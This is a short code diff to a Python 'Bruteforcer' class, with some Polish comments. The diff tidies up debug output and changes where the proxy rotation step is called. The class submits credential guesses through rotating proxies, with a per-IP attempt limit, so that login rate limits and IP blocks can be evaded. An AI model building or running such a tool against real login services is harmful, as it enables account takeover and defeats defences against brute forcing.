@@ -158,15 +158,11 @@ class Bruteforcer:
                 old_size_proxy_list = len(set(self.proxies)) - 1
                 print(f"Exception: `{URLe}`")
                 self.proxies = [i for i in self.proxies if i != self.proxies[index]]
-                print(self.proxies)
                 if index != old_size_proxy_list:
-                    print(index)
                     index = index + 1
-                    print(f"TUTAJ {index}")
                 else:
                     index = 0
                     # recursion
-                    print(f"NEW INDEX {index}")
                     index = control_the_proxy_rotation(index, data_to_post)
             return index
 
@@ -179,8 +175,8 @@ class Bruteforcer:
                     self.variables_to_injection[i], credentials[i]
                 )
             if self.proxies:
+                index = control_the_proxy_rotation(index, data_to_post)
                 if counter < self.attemps_per_ip:
-                    index = control_the_proxy_rotation(index, data_to_post)
                     # TODO
                     # jeśli się uda to git
                     # jeśli nie to zmień IP na następny
@@ -196,7 +192,7 @@ class Bruteforcer:
         pass
 
     def proxy_rotating_injection(self, index, data_bytes):
-        print(index, self.proxies)
+        # print(index, self.proxies)
         print(f"IP: `{self.proxies[index]}`, Data: `{data_bytes}`")
         proxy_handler = urllib.request.ProxyHandler(
             {"http": self.proxies[index], "https": self.proxies[index]}
